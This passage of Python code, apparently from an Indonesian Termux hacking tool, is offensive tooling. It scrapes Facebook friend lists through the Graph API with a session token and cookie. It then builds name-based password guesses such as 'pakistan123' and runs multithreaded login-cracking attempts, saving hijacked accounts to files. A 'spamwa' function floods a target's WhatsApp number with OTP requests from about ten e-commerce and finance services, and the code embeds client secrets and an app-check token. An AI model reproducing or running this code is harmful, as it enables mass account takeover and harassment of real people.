				sys.stdout.flush()			
			else:pass			
		ngatur()
	else:menu()
def menu_crack():
	menu()
def bot():
	termux('clear')
	logo()
	cetak(pnl("""[green]   [ 1 ] Buat File Dump ID Publik
   [ 2 ] Spam Wa
   [ 3 ] Buat File Dump ID Cloning Bebas
   [ 4 ] Buat File Dump ID Cloning Lokal
   [ 5 ] Menu Crack
   [ 6 ] Lapor Bug""",width=90,padding=(0,1),title=f"| [green]MENU BOT[cyan] |",style=f"bold cyan"))
	menu = input('pilih : ')
	if menu in ['1']:
		add_file()
	elif menu in ['2']:
		spamwa()
	elif menu in ['3']:
		dumfile2()
	elif menu in ['4']:
		dumfile1()
	elif menu in ['5']:
		menu_crack()
	elif menu in['6']:
		termux("xdg-open https://wa.me/+6283115331009")
	else:exit()

def add_file():	
	file = input('Nama File : ')
	ke=1
	cetak(pnl('[white]Ketik stop untuk berhenti dump',width=90,padding=(0,1),style=f"bold green"))
	for i in range(100):
		u = input('\nMasukan ID ke '+str(ke)+' : ')
		if 'stop' in u : exit()
		else:
			p = Tamsis(f'https://graph.facebook.com/v2.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
			try:
				print(p['error']['message']);continue
			except KeyError:
				try:
					h=0
					for i in p['friends']['data']:
						c = (i['id']+'|'+i['name'])
						g = (i['id'])
						if len(g)<14:pass
						else:open(file,"a").write(f'\n{c}');h+=1
						print(f'\rberhasil dump {h} ID',end='')
						sys.stdout.flush()
					print(f'\n{h} id berhasil di tambahkan ke File : {file}')
				except KeyError:print('Gagal Dump ID\n[ ! ]ID Harus Public');break
def spamwa():
	nomer = input(f"Masukan No WA Target : +62")
	jum = input("Berapa Putaran : ")
	for i in range(int(jum)):
		headers_carsome = {'Host': 'www.carsome.id','content-length': '38','accept': 'application/json, text/plain, */*','x-language': 'id','x-token': '','country': 'ID','x-amplitude-device-id': 'QbOr1g4RMMMIpnkg7JVqx7','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://www.carsome.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.carsome.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		data_carsome = json.dumps({"username":nomer,"optType":1})
		pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text		
		head2 = {"Host": "api.pintarnya.com","content-length": "27","origin": "https://pintarnya.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","cache-control": "no-cache","platform": "web-kerja","save-data": "on","referer": "https://pintarnya.com/kerja/signup","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data2 = json.dumps({"mobile":"+62"+nomer})
		pos_pintar = requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers=head2,data=data2).text		
		head3 = {"Host": "gql.tokopedia.com","content-length": "800","x-version": "d626b2d","origin": "https://www.tokopedia.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","x-source": "tokopedia-lite","save-data": "on","x-device": "tokopedia-lite","x-tkpd-lite-service": "atreus","x-tkpd-akamai": "otp","referer": "https://www.tokopedia.com/register?ld=https%3A%2F%2Fseller.tokopedia.com%2Fhome","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data3 = json.dumps([{"operationName":"OTPRequest","variables":{"msisdn":"62"+nomer,"otpType":"116","mode":"whatsapp","otpDigit":6},"query":"query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: Int, $Signature: String, $MsisdnEnc: String, $EmailEnc: String) {\n OTPRequest(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc) {\n success\n message\n errorMessage\n sse_session_id\n list_device_receiver\n error_code\n message_title\n message_sub_title\n message_img_link\n __typename\n }\n}\n"}])
		pos_tokped = requests.post("https://gql.tokopedia.com/graphql/OTPRequest",headers=head3,data=data3).text		
		head4 = {"Host": "api.dagangan.com","accept": "application/json","content-type": "application/json","content-length": "48","accept-encoding": "gzip","user-agent": "okhttp/3.12.12"}
		data4 = json.dumps({"phone":"0"+nomer,"otp_method":"whatsapp"})
		r = requests.post("https://api.dagangan.com/v2/users/sms",headers=head4,data=data4).text		
		head5 = { "Host": "api-v2.bukuwarung.com","authorization": "Bearer","x-request-source": "seller-app","x-app-version-name": "1.2.5","x-app-device": "Samsung SM-J330G","support-token": "5QEFaKytbhYvoA8gjYAmvw68l1kxmlqUfj5ygtCKZOVtUc1MbN","buku-origin": "tokoko","x-app-version-code": "135","content-type": "application/json; charset=UTF-8","content-length": "227","accept-encoding": "gzip","user-agent": "okhttp/4.9.0"}
		data5 = json.dumps({"action":"LOGIN_OTP","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn","countryCode":"62","deviceId":"92dd6e10-560b-4886-8605-46b3d9fe2288","method":"WA","phone":nomer})
		op = requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers=head5,data=data5)		
		head6 = {"Host": "www.desty.app","content-length": "115","accept": "application/json, text/plain, */*","cookies": "null","origin": "https://www.desty.app","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","referer": "https://www.desty.app/common/signup?utm_source=paidads&utm_medium=ggsem&utm_campaign=DPSEM&utm_content=CaraBisnis&gclid=Cj0KCQjw2v-gBhC1ARIsAOQdKY1gpUCSpscobmlPhQXQHUGNSs_0cAi7QTKr0DxeejusxywvC8MI84UaAhBUEALw_wcB&productBusinessSource=page","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data6 = json.dumps({"address":"+62"+nomer,"expire":"true","type":"WHATSAPP","situation":"REGISTER","language":"id","source":"Page"})
		pos6 = requests.post("https://www.desty.app/api/captcha",headers=head6,data=data6).text		
		head7 ={"user-agent": "Dart/2.16 (dart:io)","accept": "application/json","accept-encoding": "gzip","content-length": "109","host": "api-app.primaku.com","content-type": "application/json; charset=utf-8","apiversion": "2303231"}
		data7 = json.dumps({"role":"PARENT","phoneNumber":"62"+nomer,"register":"true","isSocial":"false","email":"cekontol@gmail.com"})
		p = requests.post("https://api-app.primaku.com/auth/v2/send-otp",headers=head7,data=data7).text		
		head8 = {"host": "api.bibit.id","content-length": "90","origin": "https://app.bibit.id","x-app-check":"eyJraWQiOiJsWUJXVmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjE4ODMwMjcxNDM5Mzp3ZWI6ODVjZmMxY2M2YWI1OTlkMTExNmM4OCIsImF1ZCI6WyJwcm9qZWN0c1wvMTg4MzAyNzE0MzkzIiwicHJvamVjdHNcL2JpYml0LTRjMThiIl0sImlzcyI6Imh0dHBzOlwvXC9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tXC8xODgzMDI3MTQzOTMiLCJleHAiOjE2Nzk3MTQxMTAsImlhdCI6MTY3OTYyNzcxMCwianRpIjoiZktKeUdKbG40cWowcDJJczJvd0duUTI4QlFtYjFPeXRBcXhFM3hLLVlXZyJ9.OewMoF4ShtR46xUu2yaJQcSdhvgQS2gPwCCqghwcP7878hSJTMHTRpiy-fJZ3iLugqXmIC3XDjUG_OjKb4pn8dpCUL1PokLIDr_eFh7R0QJnZ-nN3TRLXwd9EbaAHcsSUN7kEbJA8iLOUEbtpRI2b9xIVuydYCpSD4oz_5SYTm9DneKCVQ8xNy6ELxc8bzmE-6QgsY8fJDfHOpD205O1Z0ec0Csi69qD-Md7E-FdmXxkU8uZXeg2mz86l_5fwJPqeNkzdQdfyr-xfzMYnUnO1iarXezEVuG89TpoJc2jZ5n3hZUoDgkJQZ_lWQYaB4T0vhAbeLdAAU_dRkBXRdNWXGFWPx8WcKyun5cdK8ULXShcK3HfvQMWRzEWdhTRIidUdpERDFxuo-BkSaARsIP-b1SpDBB7DEghvFD-AQt2xUVbGdU_rB7pRg9091fDfyfEz7IvpGpFqIZ9jMVmxieoLHOwZ1Mo5HlY2w5O-ZL5hf_FmrATe-WnGdfy4UXCy1JK","user-agent":"Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","x-platform":"web","save-data":"on","referer":"https://app.bibit.id/register","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data8 = json.dumps({"code":"62","phone":nomer,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})
		pos_bibit = requests.post("https://api.bibit.id/auth/register/phone",headers=head8,data=data8).text		
		head9 = {"Host": "auth.dekoruma.com","content-length": "67","origin": "https://m.dekoruma.com","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","referer": "https://m.dekoruma.com/signup","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data9 = json.dumps({"phoneNumber":"+62"+nomer,"platform":"wa","captchaInput":""})
		pos9 = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=head9,data=data9).text
		pintar_head = {"Host": "pasarkuota.com","content-type": "application/x-www-form-urlencoded","content-length": "165","accept-encoding": "gzip","user-agent": "okhttp/5.0.0-alpha.5"}
		pintar_req = requests.post("https://pasarkuota.com/api/v2/pre-register",headers=pintar_head,data="c_rc=0&app_reg_id=&latitude=&c_rswa=1&c_h2w=0&token=&c_gg=1&c_pn=0&app_version_code=220924&phone=08"+nomer+"&vss=1&app_version_name=22.09.24&ui_mode=dark&longitude=")
		h=10
		for i in range(11):
			print(f'\rCD {h} detik',end='')
			if h ==0:
				print('\r===========================================')
			h-=1
		sys.stdout.flush()
		bobo(1)
def dump_masal():
	ke=1
	juml = input('Jumlah ID publik : ')
	for i in range(int(juml)):
		c = input('Masukan ID Ke '+str(ke)+' : ')
		p = Tamsis(f'https://graph.facebook.com/v16.0/{c}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			j = (p['error']['message'])
			print(j)
			break
		except KeyError:
			try:
					if 'tua' in umur:
						print('tua')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'sepuh' in umur:
						print('sepuh')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'modar' in umur:
						print('modar')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'muda' in umur:
						print('muda')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					else:
						print('acak')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					ke+=1
			except KeyError:
				print('\nGagal Dump ID\n[ ! ]ID Harus Public')
	cetak(pnl(f'Total {len(id)} Terkumpul',width=90,padding=(0,1),style=f"bold cyan"))
	p = input('Lanjut Crack (Y/n) : ')
	if p in ['n','N']:
		print(f'Yah {len(id)} Hangus ')
		exit()
	else:ngatur()
		
def dump(opsi):
	if 'massal' in opsi:
		global limitd
		u = input('ID Publik : ')
		cetak(pnl('[white]Di Sarankan Jangan Lebih Dari 30000',width=90,padding=(0,1),style=f"bold cyan"))
		limit = input('Limit : ')
		mek = 0+ int(limit)
		limitd+=mek
		p = Tamsis(f'https://graph.facebook.com/v16.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			print(p['error']['message']);pass
		except KeyError:
			try:
				for i in p['friends']['data']:
					p = (i['id'])
					if len(p)<14:pass
					else:uid.append(p)
			except KeyError:print('\nGagal Dump ID\n[ ! ]ID Harus Public')
		dump_id('masal')
	elif 'publik' in opsi:
		p = input('ID Publik : ')
		uid.append(p)
		dump_id('publik')
def dump_id(pel):
	for u in uid:
		p = Tamsis(f'https://graph.facebook.com/v16.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			j = (p['error']['message'])
			if 'publik' in pel:print(j);exit()
			else:print(j);break
		except KeyError:
			try:
				if pel in ['publik']:
					if 'tua' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'sepuh' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'modar' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'muda' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					else:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
				else:
					if 'tua' in umur:
						print('tua')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'sepuh' in umur:
						print('sepuh')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'modar' in umur:
						print('modar')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'muda' in umur:
						print('muda')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
					else:
						print('acak')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
#						ngatur()
			except KeyError:
				if 'publik' in pel:
					print('\nGagal Dump ID\n[ ! ]ID Harus Public')
				else:pass

def ngatur():
	print('\n')
	cetak(pnl("  [white]                                  MONGGO DIPILIH",width=90,padding=(0,1),style=f"bold cyan"))
	cetak(pnl("  [green] [ 1 ] Mbasic  [ 2 ] Free  [ 3 ] Mobile  [ 4 ] Stable  [ 5 ] Alpha  [ 6 ] Latest",width=90,padding=(0,1),title=f"[green]Async",style=f"bold cyan"))
	cetak(pnl("  [green]               [ 7 ] Mbasic  [ 8 ] Free  [ 9 ] Mobile  [10 ] Latest",width=90,padding=(0,1),title=f"[green]Validate",style=f"bold cyan"))
	cetak(pnl("  [green]                      [11 ] Mbasic  [12 ] Free  [13 ] Mobile",width=90,padding=(0,1),title=f"[green]Reguler",style=f"bold cyan"))
	cetak(pnl("  [yellow]                        [14 ] X (async) [15 ] D (validate)",width=90,padding=(0,1),style=f"bold cyan"))
	cetak(pnl("  [yellow]                                [ 16 ] IP (regular)",width=90,padding=(0,1),style=f"bold cyan"))
	cetak(pnl("  [yellow]                                   [ 17 ] Graph",width=90,padding=(0,1),title='[red]API',style=f"bold cyan"))
	metd=input('Metode : ')
	if metd in['1']:metode.append('metode1')
	elif metd in['2']:metode.append('metode2')
	elif metd in ['3']:metode.append('metode3')
	elif metd in ['7']:metode.append('metode4')
	elif metd in ['8']:metode.append('metode5')
	elif metd in ['9']:metode.append('metode6')
	elif metd in ['5']:metode.append('metode8')
	elif metd in ['6']:metode.append('metode9')
	elif metd in ['4']:metode.append('metode7')
	elif metd in ['12']:metode.append('metode11')
	elif metd in ['10']:metode.append('metode13')
	elif metd in ['13']:metode.append('metode12')
	elif metd in ['11']:metode.append('metode10')
	elif metd in ['14']:metode.append('metode14')
	elif metd in ['15']:metode.append('metode15')
	elif metd in ['16']:metode.append('metode16')
	elif metd in ['17']:metode.append('graph')
	elif metd in ['acak']:metode_acak()
	else:metode.append('metode1')
	sandi()
def metode_acak():
	with ThreadPool(max_workers=30) as otw:
		for tamsis in id:
			try:idinya,nama=tamsis.split('|')[0],tamsis.split('|')[1].lower()
			except IndexError:pass
			awal=nama.split(' ')[0]
			full = nama.replace(" ", "")
			if len(nama)<5:
				if len(awal)<3:pwx=['pakistan','pakistan123','pakistan12345']
				else:
					if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
					else:pwx=[awal+'786',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'123',awal+'1234',awal+'12345','pakistan','pakistan123','pakistan12345']
			else:
				if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
				else:pwx=[awal+'1122',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'786',nama,'pakistan','pakistan123','pakistan12345',awal+'123',awal+'1234',awal+'12345']
			satu=otw.submit(metode1,idinya,pwx)
			dua=otw.submit(metode2,idinya,pwx)
			tiga=otw.submit(metode3,idinya,pwx)
			empat=otw.submit(metode4,idinya,pwx)
			lima=otw.submit(metode5,idinya,pwx)
			enam=otw.submit(metode6,idinya,pwx)
			tujuh=otw.submit(metode10,idinya,pwx)
			delapan=otw.submit(metode11,idinya,pwx)
			sembilan=otw.submit(metode12,idinya,pwx)
			random.choice([satu,dua,tiga,empat,lima,enam,tujuh,delapan,sembilan])
	print('\n==================================================')
	print(' [+] Crack process completed')
	print(' [+] Akun OK Tersimpan Di tamsisOK/'+svo)
	print(' [+] Akun CP Tersimpan Di tamsisCP/'+svc)
	print('==================================================')
	exit()				
				
def sandi():
	with ThreadPool(max_workers=30) as otw:
		for tamsis in id:
			try:idinya,nama=tamsis.split('|')[0],tamsis.split('|')[1].lower()
			except IndexError:pass
			awal=nama.split(' ')[0]
			full = nama.replace(" ", "")
			if len(nama)<5:
				if len(awal)<3:pwx=['pakistan','pakistan123','pakistan12345']
				else:
					if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
					else:pwx=[awal+'786',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'123',awal+'1234',awal+'12345','pakistan','pakistan123','pakistan12345']
			else:
				if len(awal)>9:pwx=['pakistan','pakistan123','pakistan12345']
				else:pwx=[awal+'786',full+'1',full+'12',full+'123',full+'1234',full+'12345',full+'786',full+'1122',awal+'123456',nama,'pakistan','pakistan123','pakistan12345',awal+'123',awal+'1234',awal+'12345']
			if 'metode1' in metode:
				otw.submit(metode1,idinya,pwx)
			elif 'metode2' in metode:
				otw.submit(metode2,idinya,pwx)
			elif 'metode3' in metode:
				otw.submit(metode3,idinya,pwx)
			elif 'metode5' in metode:
				otw.submit(metode5,idinya,pwx)
			elif 'metode4' in metode:
